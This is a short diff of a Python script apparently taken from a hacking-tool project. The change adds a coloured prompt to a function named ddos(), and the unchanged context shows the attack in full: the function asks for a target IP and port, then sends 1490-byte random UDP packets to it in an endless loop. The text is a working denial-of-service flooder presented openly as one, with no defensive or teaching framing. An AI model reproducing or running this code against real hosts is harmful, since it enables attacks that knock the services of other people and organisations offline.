@@ -5,12 +5,13 @@ import socket
 import random
 
 def ddos():
+    using = "\33[91;1musing\33[00m(\33[92;1mddos\33[00m) "
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes = random._urandom(1490)
     try:
-        ip = raw_input("ip<( ")
+        ip = raw_input(using + "ip<(")
         ip = socket.gethostbyname(ip)
-        port = input("Port<( ")
+        port = input(using + "Port<( ")
         sent = 0
         while True:
             sock.sendto(bytes, (ip,port))
